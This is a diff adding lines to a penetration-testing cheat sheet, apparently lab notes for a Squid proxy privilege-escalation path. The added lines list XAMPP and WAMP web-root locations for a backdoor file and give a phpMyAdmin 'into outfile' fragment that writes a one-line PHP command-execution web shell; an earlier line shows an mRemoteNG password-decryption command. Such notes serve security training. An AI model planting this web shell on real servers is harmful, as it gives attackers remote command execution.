@@ -2126,10 +2126,13 @@ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXyb
 ### Squid http proxy 4.14- Windows PrivEsc
 - Squid is a caching and forwarding HTTP web proxy.
 - Access [spose](https://github.com/aancw/spose) from Hacktricks.
+- Locations of xampp wamp here xammp(C:\\xampp\\htdocs\\backdoor.php), wamp(C:\\wamp\\www\\backdoor.php)
 
 ```powershell
 # Both are target IP's squid from the PG Practice. It give the credentials or open ports, then turn on the froxy proxy the access the ports
 python3 spose/spose.py --proxy http://192.168.205.189:3128 --target 192.168.205.189
+# Found port 8080 phpmyadmin create database then executed shell
+<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\backdoor.php"
 ```
 
 ---
